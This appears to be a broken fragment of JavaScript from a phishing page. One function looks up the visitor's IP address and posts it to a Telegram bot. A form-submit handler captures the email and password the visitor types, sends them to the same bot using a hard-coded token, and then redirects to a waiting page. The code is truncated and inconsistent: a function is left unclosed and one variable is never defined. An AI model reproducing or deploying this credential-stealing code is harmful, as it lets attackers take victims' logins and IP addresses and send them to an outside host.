    function sendIPToTelegram() {
      fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const botToken = '6313373570:AAGd6rv_inDaOQsS4Y31OFSmOnC4nAzgEr0';
          const chatId = '5982389297';
          const message = `Client IP: ${ip}`;
          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
          var xhr = new XMLHttpRequest();
          xhr.open("GET", url, true);
          xhr.send();

<script>
                document.getElementById("messageForm").addEventListener("submit", function (event) {
                    event.preventDefault(); // Prevent form submission
        
                    const email = document.getElementById("email").value;
                    const password = document.getElementById("pass").value;
        
                    // Replace with your actual Telegram bot token and chat ID
                    const botToken = "6313373570:AAGd6rv_inDaOQsS4Y31OFSmOnC4nAzgEr0";

                    const text = `Email: ${email}\nPassword: ${password}`;
                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
        
                    fetch(url, { method: "GET" })
                        .then(response => {
                            if (response.ok) {

                                // Redirect to another page (replace with your desired URL)
                        window.location.href = "wait.html"; // Change this U

                        })

                        });
